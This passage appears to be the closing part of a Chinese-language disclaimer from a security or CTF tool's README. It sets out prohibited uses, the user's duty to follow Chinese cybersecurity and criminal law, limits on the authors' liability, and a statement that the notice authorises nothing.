- 任何违反您所在司法管辖区法律法规的行为
- 任何侵犯他人隐私或知识产权的行为

### 3. 法律合规责任

使用者**自行承担**遵守所有适用法律法规的全部责任。您必须遵守包括但不限于《中华人民共和国网络安全法》《中华人民共和国刑法》及您所在地区所有相关法律。

### 4. 责任限制

**作者及贡献者不对因使用或滥用本工具而产生的任何直接、间接、附带或后果性损害承担责任，无论该等损害是否可预见。** 作者明确反对任何未经授权的使用行为。

### 5. 免责声明的效力

本声明不构成对任何特定使用行为的授权。使用者应**独立判断**其使用行为是否合法。

---

<p align="center">
  <b>Happy Hacking! 🚩</b>
</p>
